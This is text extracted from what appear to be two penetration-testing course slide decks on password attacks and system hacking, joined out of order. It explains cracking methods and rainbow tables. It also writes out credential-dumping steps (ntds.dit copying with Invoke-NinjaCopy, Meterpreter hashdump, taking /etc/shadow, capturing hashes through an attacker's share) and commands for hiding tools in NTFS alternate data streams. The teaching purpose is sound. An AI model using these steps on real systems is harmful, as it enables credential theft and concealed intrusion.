[slide31.xml] SMTP commands to know VRFY: Used to verify whether a given mailbox exists on the local host. Example: Verify whether mike is a mailbox on host abc.com:  SMTP client: VRFY mike SMTP server: 250  mike@abc.com EXPN: Does the same thing as the VRFY command, used to verify whether a given mailbox exists on the local host. RCPT TO: Use the RCPT TO command to specify mail recipients
[slide32.xml] System Hacking If the account holder is not known to you, focus on accounts that  Haven’t had password changes for a long time Have weakly protected service accounts Have poorly shared accounts Indicate the user has never logged in Have information in the comment field that might be used to compromise password security

[slide34.xml] Biometrics terms False Acceptance Rate (FAR)  users who were accepted by the biometric system but should have been rejected because they are not authorized.  AKA Type 1 error. False Rejection Rate (FRR)  users who were rejected by the biometric system but should have been accepted because they are authorized.    AKA Type 2 error. The crossover error rate (CER)  where the  FAR and FRR when intersect. In general, the biometric device with the lowest CER is the most accurate. Strongest: Iris  biometrics are considered one of the strongest forms of authentication.  Weakest: Voice  biometrics are considered or even fingerprint, depending on how these systems are implemented.
[slide35.xml] Crossover Error Rate
[slide36.xml] Authentication Methods

[slide40.xml] Password Guessing Tools
[slide41.xml] Tools for Replaying the password hash These programs allows an attacker to authenticate to a remote server using the LM/NTLM hash of a user’s password. Thereby eliminating  the need to crack/brute-force the hashes to obtain the clear-text password.   Because Windows does not salt passwords, they remain static from session to session until  the password is changed. If an attacker can obtain a password hash, it is functionally  equivalent to obtaining the clear-text password.   Rather than attempting to crack the hash, attackers can capture and simply replay the hash to gain unauthorized access. Pass-The-Hash ScoopLM
[slide42.xml] Cracking the Passwords One direct way to remove the passwords from a local or remote system is by using  L0phtcrack .  L0phtcrack is a Windows password-cracking tool.  LC6 is the current version. It can extract hashes from the local machine, a remote machine, and can sniff passwords from the local network if you have administrative rights.   Tools like  FGdump  and  PWdump  are other good password-extraction tools.
[slide43.xml] Three types of password cracking Dictionary, Hybrid,  and brute-force attacks.
[slide44.xml] A dictionary password attack   Pulls words from the dictionary or word lists to attempt to discover a user’s password.   A dictionary attack uses a predefined dictionary to look for a match between the encrypted password and the encrypted dictionary word.  Many times, dictionary attacks will recover a user’s password in a short period of time if simple dictionary words are used.
[slide45.xml] A hybrid attack  Uses a dictionary or a word list and then prepends and appends characters and numbers to dictionary words in an attempt to crack the user’s password. These programs are comparatively smart because they can manipulate a word and use its variations.  For example, take the word password . A hybrid password audit would attempt variations such as 1password, password1, p@ssword, pa44w0rd, and so on.  Hybrid attacks might add some time to the password-cracking process, but they increase the odds of successfully cracking an ordinary word that has had some variation added to it.
[slide46.xml] Brute-force attack  Uses random numbers and characters to crack a user’s password. A brute-force attack on an encrypted password can take hours, days, months, or years, depending on the complexity and length of the password.  The speed of success depends on the speed of the CPU’s power.   Brute-force audits attempt every combination of letters, numbers, and char Tools such as  L0phtcrack, LCP, Cain and Abel, and John the Ripper  can all perform dictionary, hybrid, and brute-force password cracking. 
[slide47.xml] Using Rainbow tables A rainbow table is a precomputed table for retrieving password hashes. Passwords and their corresponding hashed values are stored in a file called a rainbow table.  An hashed password can be quickly compared to the values stored in the table and cracked within a few seconds.  RainbowCrack and Ophcrack  are examples of two such programs. Ophcrack is a password-cracking tool that implements the rainbow table techniques. What’s most important to note here is that if a password is in the rainbow table, it will be cracked quickly.  Its website also lets you enter a hash and reveal the password in just a few seconds.

[slide50.xml] Kerberos  Kerberos protocol developed to provide a secure means for  mutual authentication  between a client and a server. It enables the organization to implement single sign-on (SSO).  The default port for Kerberos 88. KerbCrack , can be used to attack Kerberos.  It consists of two separate programs.  The first portion is a sniffer that listens on port 88 for Kerberos logins, and  the second portion is used as a cracking program to dictionary or brute-force the password.
[slide51.xml] Kerberos Kerberos - authentication protocol https://www.youtube.com/watch?v=_44CHD3Vx-0 6:07 MicroNugget: How Does Kerberos Work? https://www.youtube.com/watch?v=kp5d8Yv3-0c 7:07
[slide52.xml] Keystroke loggers Hardware keystroke loggers  Are completely undetectable, except for their physical presence.   Some hardware key loggers use WiFi, which means the attacker can communicate with it remotely via wireless or Bluetooth connection. Software keystroke loggers (easier to spot with antivirus) Sit between the operating system and the keyboard. they operate in stealth mode and can grab all the text a user enters.
[slide53.xml] Software keyloggers IKS Software Keylogger : Windows-based runs silently at the lowest level of the OS. The program is almost impossible to discover after the program file and the log file are renamed by the install utility.   An exhaustive hard drive search won’t turn up anything. And the running process won’t show up anywhere. Ghost Keylogger : Windows-based software keystroke logger, which is an invisible surveillance tool that records every keystroke to  an encrypted log file. The log file can be sent secretly by email to a predefined address. Spector Pro : This program captures keystroke activity and email, chat conversations, and instant messages. FakeGINA : Designed for one thing: to capture login usernames and passwords that are entered at system startup. This Windows tool intercepts the communication between Winlogon and the normal Graphical Identification and Authentication (GINA) process, captures all successful logins, and writes them to a text file.   Eblaster:  Captures all types of activity, organizes the information, and sends detailed reports to a predefined email address at specified intervals.

[slide55.xml] Privilege Escalation and Exploiting Vulnerabilities Common techniques include the following: Exploiting an application maybe a buffer overflow attack Tricking the user into executing an attack program Gaining interactive access to the system, such as Terminal Server, pcAnywhere Two types of privilege escalation : Vertical :  when a lower-level user executes code at a higher privilege level than they should have access to. Horizontal : When a user executes code at the same level but on a different machine at a different location that should be protected from access.
[slide56.xml] Escalation Technique Windows 10 privilege Escalation Technique https://www.youtube.com/watch?v=RdnVC0kNxN4 11:10

[slide58.xml] Buffer Overflow Applications set aside special areas of memory, called buffers, for use as storage, frequently setting aside a fixed amount of memory for a buffer. A buffer overflow exists when an application attempts to store more data than can fit in a fixed-size buffer. Buffer overflow attacks occur when an intruder is able to send data in excess of a fixed-size application buffer and the application does not check to ensure this doesn’t happen. By overflowing a buffer with executable code, an intruder can cause an application to perform unexpected and often malicious actions using the same privileges the application has been granted.
[slide59.xml] Heap vs Stack overflow Heap  A type of buffer overflow that occurs in the heap data area. The Heap data area is where a program stores pointers to other memory areas the program may need. The attacker corrupts the heap data area by overwriting the pointers.   The result is that the pointer now points to the attackers code. Stack Are caused when a program writes more data to a buffer located on the stack than what is actually allocated for that buffer. Stacks  in computing are regions of  memory  where data is added or removed in a  last-in-first-out (LIFO)  manner. Overfilling a buffer on the stack is known as stack smashing.  If the stack buffer is filled with code from the attacker then the attacker can corrupt the stack in such a way as to inject executable code into the running program and take control of the process.
[slide60.xml] Buffer overflow How to exploit a buffer overflow vulnerability - Practical https://www.youtube.com/watch?v=hJ8IwyhqzD4 9:43 Buffer Overflow Attack - Computerphile https://www.youtube.com/watch?v=1S0aBV-Waeo 17:29
[slide61.xml] Techniques attacker use to hide. Disabling logging:  Auditpol  Clear the log file: Tools such as Winzapper, Evidence Eliminator, and ELSave can be used. 
[slide62.xml] Rootkits Once installed, a rootkit can be used to hide evidence of the attacker’s presence and to give the attacker backdoor access to the system.  Rootkits require root access, but in return they give the attacker complete control of the system.  The attacker can come and go at will and hide his activities from the administrator.  Rootkits can contain log cleaners that attempt to remove all traces of an attacker’s presence from the log files. Rootkits can be divided into several categories: Hypervisor: Modifies boot sequence of virtual machine Hardware/firmware: Hides in hardware or firmware Bootloader: Replaces the original bootloader Library level: Replaces original system calls Application level: Replaces applications binaries with fake ones Kernel level: Adds malware to the security kernel
[slide63.xml] Rootkits Avatar:  It uses a driver infection technique.  Avatar makes use of a dropper to prevent detection by intrusion detection.  Necurs:  It installs a kernel-mode rootkit. Azazel:  This rootkit is a userland rootkit based off the Jynx rootkit.   The term  userland  references all code that runs outside the operating system’s kernel.    Azazel is focused heavily on anti-debugging and anti-detection. Zeroaccess: U ses advanced techniques to hide its presence and is designed to infect Windows computers.   It can be used as a dropper to load other malware and contains a strong self-defense functionality
[slide64.xml] Tools to find rootkits Chkrootkit:  An excellent tool that enables you to search for signs of a rootkit. RootKitRevealer:  A standalone utility used to detect and remove complex rootkits. McAfee Rootkit Detective:  Designed to look for and find known rootkits. It can examine system binaries for modification. Trend Micro RootkitBuster:  Another tool that scans file and system binaries for known and unknown rootkits.
[slide65.xml] Hiding hacking tools One method  is to use Windows NTFS alternate data streams (ADS).   ADS gives the attacker the ability to insert data into existing files without affecting their functionality, size, or display to traditional file browsing utilities like dir or Windows Explorer.   ADS are extremely easy to make and require little or no skill. Common DOS commands like "type" are used to create an ADS. These commands are used in conjunction with a redirect [>] and colon [:] to insert one file into another. For instance:  the command  "type c:\anyfile.exe > c:\winnt\system32\calc.exe:anyfile.exe“     will insert the windows calculator program with an ADS "anyfile.exe."
[slide66.xml] Using NTFS ADS to hide files To create an ADS Type certguide.zip > readme.txt:certguide.zip This command streamed certguide.zip behind readme.txt. This is all that is required to stream the file.  Now the original secret file can be erased: Erase certguide.zip To retrieve the hidden file is to type the following: Start c:\readme.txt:certguide.zip This will execute the ADS and open the secret file.
[slide67.xml] ADS Videos Alternate Data Streams on Windows (NTFS) https://www.youtube.com/watch?v=qBrFW3gpjpM 7:52 Alternate Data Streams - a hacking and forensics  howto https://www.youtube.com/watch?v=rF4sIxDIhEk 6:52
[slide68.xml] Hide tools in Linux (Slack Space) Blocks are specific sized containers used by file system to store data.  When data is stored in these blocks two mutually exclusive conditions can occur; The block is completely full, or the block is partially full. If the block is completely full then the most optimal situation for the file system has occurred.  If the block is only partially full then the area between the end of the file the end of the container is referred to as slack space.  Bmap  is a Linux tool can pack data into existing slack space.  Anything could be hidden there, as long as it fits within the available space. 
[slide69.xml] The End

[slide4.xml] Introduction  to Passwords Many think exploitation is the sole dominate force in penetration testing This is wrong So what comes first: exploitation or password attacks? This depends on the circumstances These steps can be intermixed But what if I already have root on the box? Is that enough?  Many users synchronize their passwords on other systems Password reuse is a common practice  Default passwords are commonly left on systems You may have limited access on the current system, but could gain higher privileges on a different system  Administrators will commonly implement Single Sign On (SSO) Pen Testers must understand that password attacks are a critical component Getting a single big exploit on a major flaw isn’t everything
[slide5.xml] Remembering  the  Goal The goal of a pen tester is to find access to valuable information or critical services Different accounts may have important information in which the customer may be interested in Since users typically synchronize password between systems  Users will sometimes save their passwords in the browser Each account can have valuable information If you gain root access via an exploit, begin cracking the password file Windows: SAM Linux: /etc/shadow It is best to have an offline password cracking system (or systems)
[slide6.xml] The  History  of Passwords Definition : “A secret word or string of characters that is used for  authentication , to prove identity or gain access to a resource.” – Wikipedia Passwords or Watchwords were used in ancient times by sentries to challenge a person or group attempting to enter or pass through an area.  Polybius (a Greek historian, 200-118 B.C.) described the use of watchwords in the Roman military.  Use in military was common and included a passwords and a counter-password ( challenge  and  response ) First use in computer systems: MIT’s CTSS used a LOGIN command that requested a user password “PASSWORD” which would turn off the printing mechanism In 1978, Robert Morris invented the idea of storing passwords in a  hashed  form as part of he Unix operating system  Created crypt(3) algorithm that used a 12 bit  salt  and invoked a modified form of DES 25 times to reduce the risk of pre-computed dictionary attacks
[slide7.xml] Terminology Today passwords are used as a form of  access control  to information systems Passwords don’t have to be words in which people use the term  Passcode e.g. – PIN, Personal Identification Number If multiple words are combined (e.g. – a sentence) the term  Passphrase  is used Question for the class: Besides passwords, what other methods might be used as a form of access controls? 
[slide8.xml] Increasing  the Difficulty Salting is commonly used in UNIX/Linux OS’s as a means to increase the difficulty of password cracking A salt consists of random bits which are added into the one-way hash function The salt is usually stored along with the output of the password Additionally, the number of iterations is stored as well (e.g. – Key Stretching) Salting is very similar to concept of  nonce nonce - an arbitrary number that can be used just once Benefit – if the salt is large enough An attacker cannot use a pre-computed rainbow table of hashed values due to its size Each variation of the password and salt would be hashed which hdeastically increases the size of the table A dictionary attack is still possible, but is much slower
[slide9.xml] Guessing  vs. Cracking Often, they are used interchangeably Password Guessing: Requires an attempt to enter the exact password to login Solution = Clues from social engineering Problem = Generates unwanted network traffic, log entries and ultimately: Account Lockout/DoS (Too many red flags!) It is much slower than cracking Administrators can throttle the authentication speed when multiple incorrect entries are entered Password Cracking: Attackers gain encrypted/hashed passwords either by the target system or network sniffing Cracking can be run on attacker system(s) Much faster than guessing Won’t cause account lockouts or fill logs up
[slide10.xml] Guessing
[slide11.xml] Activity Check: Lockout Policy Activity Check: For those of you running Windows, what do you see when you run the command:  net accounts?  Quick Tip :  [Windows Key] + r cmd.exe net accounts
[slide12.xml] Windows  Account Lockouts NOTE :  The original admin account (by default) cannot be locked out! Done to prevent DoS attempts Keep in mind, the admin account can be renamed Can be identified by the SID with a suffix of 500 View SID’s using the wmic command:  wmic  useraccount  list brief WMIC =  Windows Management Instrumentation Command-line However, Microsoft has a tool:  passprop.exe A free tool that will change the default behavior Run the tool with the switch:  / adminlockout Older tool, designed for Windows 2000/2003 In newer versions, this is controlled via Local Policy Target environment may be monitoring for account lockouts via lockoutStatus.exe by Microsoft (More information: https://goo.gl/NP2PV2) Gathers information from Active Directory of locked accounts alockout.dll Records a txt file of applications that cause lockouts
[slide13.xml] Activity Check: Account List  Activity Check: For those of you running Windows, what do you see when you run the command:  wmic  useraccount  list brief?  Quick Tip :  [Windows Key] + r cmd.exe wmic  useraccount  list brief
[slide14.xml] Linux Account  Loc k ou t s Account Lockout Less likely to be configured If it is, probably via Pluggable Authentication Module (PAM) Available on Solaris, AIX, HP-UX, Debian, etc. Look for a module called  pam_tally Tallies lockout attempts Documentation is usually in  / usr /share/doc/pam-[version#]/ txts / README.pam -tally Describes the account lockout settings Configuration stored in  / etc / pam.d or  / etc / pam.conf User grep to search for the term  tally  to see if the lockout is set grep tally / etc / pam.conf Usually the root account is not set to lockout It can be set:  even_deny_root_account
[slide15.xml] Linux Account  Loc k ou t s (cont.) Bottom Line : Should you use password guessing or not? This depends on the assessment, but it is not typically advisable If guessing is necessary  Ultimately, you could have a test account created to test for lockouts, force account locks, and test if the policy/policies is/are effective Could also have administrators show the account lockout policy Side note:  To prevent account lockouts on both Windows and Linux systems, it is advisable to only test the credentials of an account a  maximum of two times
[slide16.xml] Windows AD Active Directory (AD) Domain controllers store account information in: %SYSTEMROOT%\ntds\ntds.dit Files can grow very large – even if there are only a few accounts This stores the account information for the entire domain in complex schemas Note: On assessments for large domains, this file has been seen as large as 60GB, but could be larger You can gain access by physical access and administrative privileges ntds.dit is locked on a running domain controller  Cannot access it directly You can boot to a special domain administrator recovery mode to get a copy of the file, but this is not necessary Password hashes are loaded into the running authentication processes (lsass.exe) This means we could dump the domain password representations This will be covered later on
[slide17.xml] Windows AD (cont.) The ntds.dit file can be copied using PowerSploit’s Invoke-NinjaCopy Invoke-NinjaCopy -Path C:\Path\To\ntds.dit -verbose -localdestination C:\Path\To\Extraction\ntds.dit Then, use  secretsdump  or  ntdsxtract  to extract the hashes from the files (there are other tools that can be used to do) After the hashes are pulled,  hashcat  or another password cracking tool could be used to crack the hashes NOTE: While there are online resources available for cracking hashes, it is not advisable to use these services (free or otherwise) as this could leak sensitive customer passwords to the owners of the websites and other third parties
[slide18.xml] Passwords There are 2 methods used for password representations in the SAM database storage : LANMAN and NT Hashes LANMAN is notorious for being weak and easily crackable It is not even the hash, but a  OWF  or a  One Way Function (not ozone widget framework) It relies on the DES algorithm  We will cover the LANMAN OWF in later slide
[slide19.xml] Windows Passwords There are several options for gathering Windows password representations We’ll discuss these tools in-depth later such as: Metasploit Meterpreter’s hashdump command/script Sniffing the Challenge and Response from network traffic pwdump to extract the SAM database via admin privileges for gathering hashes using NetBIOS and SMB protocols Remember NetBIOS uses TCP ports 135-139 and 445 for SMB fgdump Legacy tool for Windows NT/2K/XP/2K3 Must be ran as an administrator  Additional tools: Cobalt Strike has password dumping tools included, such as: hashdump logonpasswords Mimikatz
[slide20.xml] Linux  Passwords Most use the crypt(3) algorithm of the OS The input relies on user password and a random salt UNIX uses different schemes (MD5-based, Blowfish-based, NT Hash, SHA2-based) Linux (since v2.7) usually uses DES, MD5, and SHA256 Password representation stored in: /etc/passwd or /etc/shadow Check the hashes to determine which was used: MD5 = $1$+[salt]+[salted password combination] DSDi Extended DES = begins with an underscore ‘_’ Blowfish = $2$, $2a$, $2x$, $2y$ SHA256 = $5$ SHA512 = $6$ NT Hash = $3$
[slide21.xml] Linux Process User Password (any length) Password and Salt are hashed together using MD5 Creates Temp Result #1 Result #1 is hashed together with the password and salt again Creates Temp #2 Repeated over 1,000 times During the hashing different combinations are used with the password, result, and salt
[slide22.xml] More  on Linux User password (any length) Password is stripped to 8 characters in length A bit is stripped from each character to turn into a 7 bit ASCII representation Results in 56 bits from 8 characters times 7 bits (8 * 7 = 56) This is used as a DES key to encrypt block of 0’s (64 bits) Round #1 result Process is repeated 25 times (depending on OS) Final result is base64-encoded
[slide23.xml] Linux Passwords Once you get access to the Linux box Grab the password representations from the file system  Copy the  /etc/passwd It is world-readable (anyone can copy the file with an privilege level) Includes: login names, UID numbers, and GID numbers Copy the  /etc/shadow Not world-readable (only UID 0) Contains shadowed password representations If you have limited access and look at /etc/passwd You can determine if the password representations are stored in it by the second field of each line (colon-delimited) The password is not set there if a ‘ !! ’, ‘ * ’, or ‘ x ’ is present We will discuss a tool called John-the-Ripper Has a way to combine account information into a file for cracking using the  unshadow  script
[slide24.xml] LANMAN Hashing   If password is > 14 characters, it chops it off at 14   If password is < 14 characters, it NULL pads it to 14   It then converts to all upper case   Splits the password + pad into two 7 character    chunks   Each chunk is used as a DES key to encrypt the    constant string KGS!@#$% Concatenates the results together and stores in the SAM
[slide25.xml] NTLM Due to the weakness in LANMAN Microsoft released NTLM in Windows NT 4.0 SP4 Passwords up to 256 characters Doesn’t split like LANMAN Retains case sensitivity  Does not use  salting , thus Use Rainbow tables for attacks Note: Salting increased the difficulty of cracking NTLMv1 uses DES NTLMv2 uses MD5 NT algorithm is simple and stronger
[slide26.xml] LANMAN C&R
[slide27.xml] LANMAN C&R Challenge1 Challenge2 Challenge3 Response1 Response2 Response3 16  bytes  long LANMAN HASH Each are 7  bytes   21  bytes  long total  Used as DES key Each 8 bytes Ser v er Client 7 bytes	 7 bytes 7 bytes #1 #2 7 bytes #3 Same process  for NTLMv1  but uses a 16-byte  NT  Hash  vs LANMAN
[slide28.xml] NTLMv2 C&R
[slide29.xml] NTLM C&R NT HASH Account Name Domain NTLMv2 OWF Server  Challenge Timestamp Client Challenge Ser v er Client Client Challenge NTLMv2 Response HMAC-MD5 . Algorithm
[slide30.xml] Sniffing  the C&R So, how do we sniff the challenge/response? Eliminates the need for getting the SAM database There are two options: Sniff the C&R between the client and server exchange This requires a man-in-the-middle attack (spanning port on a switch) Attacker must crack the authentication protocol used between and server You can also cause the client system into performing C&R with the attackers system - There is also the possibility of forcing the client to use a weaker C&R 	- Trick the user via email link to the attackers system              ( file://ipaddress/share )  	- The client system (when clicking the link) will mount a share on             the attacker’s system thus performing a Windows authentication and             providing the ability to sniff during it
[slide31.xml] Collecting  Windows Passwords There are many tools available for extracting password hashes from Windows Metasploit Meterpreter hashdump Remember this as part of the privilege module This doesn’t rely on Windows print and file sharing protocols/API’s (which may be blocked) Sniffing the challenge/response from network traffic We just discussed this – most likely NTLMv1/v2 pwdump  Most common way to extract the SAM database Uses administrator privileges using Windows protocols/APIs It can grab local accounts on non-domain controllers and active directory domain controllers fgdump Similar to pwdump but addresses antivirus issues Incorporates cachedump functionality to pull another form of passwords from Windows
[slide32.xml] M e t erp r e t er Remember Meterpreter’s hasdump? Meterpreter is running inside of a process on the target with Administrator or local SYSTEM privileges Privilege hashdump extractor runs in memory of the exploited process (entirely memory resident running as DLL) This is great because we don’t rely on NetBIOS/SMB protocol across or even access the file system/hard drive  Invoked by running  hashdump  at the Meterpreter prompt Result will be a hashdump from the target system Downside: This is more invasive and cause a system crash Hash can also be pulled by running the  hashdump script Invoked by:  run hashdump  at the Meterpreter prompt Hashes are extracted differently than the 1 st  method Looks in Windows file system Registry Data Hashes could be encrypted via Windows Syskey The script also recovers the Syskey from the Registry too This is automatically used to decrypt the hashes Positive-side: It’s less intrusive and less likely to cause a system crash 
[slide33.xml] Dumping pwdump (version 1-7) Uses admin privileges Accesses a remote share to place extraction code (DLLs and executables) Runs the code for the DLL injection into LSASS (local security authority subsystem service) process Uses the Windows  CreateRemoteThread  API call to execute and extract hashes It then deletes itself and closes the shares pwdump6 and 7 work on Vista and later on 32 and 64 bit  pwdump7 runs by extracting the binary SAM and SYSTEM file from the file system and then hashes are extracted (uses Syskey to decrypt) It does not support AD passwords that are stored in ntds.dit gescdump is a similar tool to extract hashes from SAM and AD
[slide34.xml] Building Dictionaries Build your own set of customized dictionaries Several sources for collection, commercial and free https://github.com/danielmiessler/SecLists/tree/master/Passwords https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm https://blog.skullsecurity.org/2010/the-ultimate-faceoff-between-password-lists  (Ron Bowes) Maintain a single compilation file as well as grouped files for fine-tuned attacks Fine-tuning your attack by: Gathering information from their website Grab employees names, company terms Adjust to their password policy (if known) Ensure there are no duplicate words (slows down) 	cat password_list.txt | sort | uniq > masterlist.txt
[slide35.xml] Customized Wordlists Products available to generate dictionaries CeWL is a great tool for this Crawls websites to create a list http://www.digininja.org http://fonlow.com/zijianhuang/kpa/dic.html Windows dictionary tool Manually generate your own list $ mkdir /tmp/source $ cd /tmp/source $ wget -r -l [#] [url] $ cd .. $ grep -h -r “” source | tr ‘[:space:]’ ‘\n’ | sort | uniq > passwordlist.txt $ grep -v ‘<‘ passwordlist.txt > masterlist.txt Start generating rainbow tables Saves valuable time (depending on the algorithm use (e.g. – use of salting Can be bought or you can build it 
[slide36.xml] Rainbow Tables: What  Are They? What are Rainbow Tables and Why they are needed?  Typically, cracking was a repetitive time-consuming process of guessing, hashing, comparison, and try-again Rainbow tables speed up the process by a time-memory trade-off Example White papers: http://www-ee.stanford.edu/~hellman/publications/36.pdf Martin Hellman (co-creator of Diffie-Helman key exchange) provided the concept of leveraging memory to store crypto results for huge numbers of keys ahead of time Ultimately this provides a way to lookup results in a pre-crypto dict Results: Speed reduces traditional cracking of day/weeks to seconds The largest time consuming part is building the crypto dictionary Great reason for Rainbow Tables, we can reuse them Note: Rainbow Tables don’t reduce the overall computations
[slide37.xml] Rainbow Tables So Rainbow Tables are: A pre-computed table for crypto hash functions to crack Rainbow Tables are very large If we store all of our hashes in tables Think if we wanted a LANMAN hash table for all alphanumeric  26 alphanumeric characters (LANMAN is only uppercase) + 10 numeric So for a 1 character password, there are 36 possibilities For a 2 character password, there are 1296 possibilities (36*36) What if we added lowercase and special characters? We would have more than 8 trillion different passwords What about hard drive storgage space? If we have 69 characters total, we would have 7.5*10^2 = ~8 trillion If a password is 7 bytes and the hash is 8 bytes The storage space needed is ~112 TB This does not include any metadata, indexes, etc. 
[slide38.xml] More  on  Rainbow Tables Most Rainbow Tables : Don’t store a full index of complete hashes Typically store “chains” that assist in deriving the passwords from hashes Chains are a set of password and hash relationships that are linked together based on the function used Chains are constructed by using either a password hash function or through the used of a reduction formula Reduction Functions: Takes a hash and converts it into another possible password (not the original password) The name “reduction” is from the ability to take a large hash and  reduce  its size to a possible password There are numerous different reduction functions available Each use a different algorithm to create the linking relationship 
[slide39.xml] What  Do  You Need? What do you need? A lookup tool, a set of Rainbow Tables, and the hashes to be cracked The lookup tool must be compatible with the rainbow table storage sata structure (metadata, architecture, functions) Note: Rainbow Tables are not typically used for salted hashes You would need a different rainbow table for each variation of the salt This us due to how the salt is folded into the password algorithm
[slide40.xml] Myth  vs. Reality Misconception A list of every password hash used for comparison Actually (http://freerainbowtables.com/faq) Built on the concept of chains (http://kestas.kuliukas.com/RainbowTables/) A relationship of password/hash which are grouped Chains start at a certain plaintext and end at a certain hash Hash functions map plaintext to hashes (one-way function) Reduction functions map hashes to plaintexts (one-way function) But it is not an inverse function and does not give you the original plaintext
[slide41.xml] Rainbow  Table Creation Create password Hash password Apply reduction Hash  new results Apply reduction Rinse  and repeat D o g w1asd0fcanh9l2… ask d l j a i os d j o i j i Hash 2 New  Password #3 Hash 3 Hash 1 Original  Password #1 New  Password #2 New  Password #4 Hash 4 s5d3fc2ahuoah…. h1m zad8vc8i6pcdfy…. New  Password # x az3 7fs vbs Hash Function Reduction Function Rinse  & Repeat (end with potential password)
[slide42.xml] Building Tables Hash 2 Password x Initial Password Hash Function Hash 1 Reduction Password 2 Hash Function Reduction Hash Function Hash x Reduction Password Z . . . Initial Password Password Z
